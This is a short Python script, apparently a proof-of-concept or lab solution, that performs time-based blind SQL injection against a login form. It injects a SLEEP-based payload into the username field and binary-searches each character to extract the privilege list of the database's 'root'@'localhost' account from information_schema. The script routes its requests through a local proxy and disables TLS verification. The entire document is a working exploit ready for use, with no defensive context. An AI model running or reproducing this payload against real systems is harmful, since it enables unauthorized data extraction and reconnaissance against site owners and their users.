import sys
import requests

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_exploit(url):
    extracted_data = ""
    
    for i in range(1, 306):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            
            sql_payload = "' OR IF(ASCII(SUBSTRING((SELECT group_concat(privilege_type) FROM information_schema.user_privileges WHERE grantee=\"\'root\'@\'localhost\'\"), %s, 1)) > %s, SLEEP(2), SLEEP(0))-- -" % (i, mid)
            
            post_data = {
                'username': 'ad' + sql_payload,
                'password': 'ad'
            }

            try:
                r = requests.post(url, data=post_data, verify=False, proxies=proxies)

                if int(r.elapsed.total_seconds()) > 1.5:
                    low = mid + 1
                else:
                    high = mid - 1

            except Exception as e:
                print(f"An error occurred: {e}")
                return None
        
        extracted_data += chr(low)  
        sys.stdout.write('\r' + extracted_data)
        sys.stdout.flush()

    return extracted_data

def main():
    if len(sys.argv) != 2:
        sys.exit(-1)

    url = sys.argv[1]
    extracted_data = sqli_exploit(url)
    print("\n(+) Extracted Data: %s" % extracted_data)

if __name__ == "__main__":
    main()
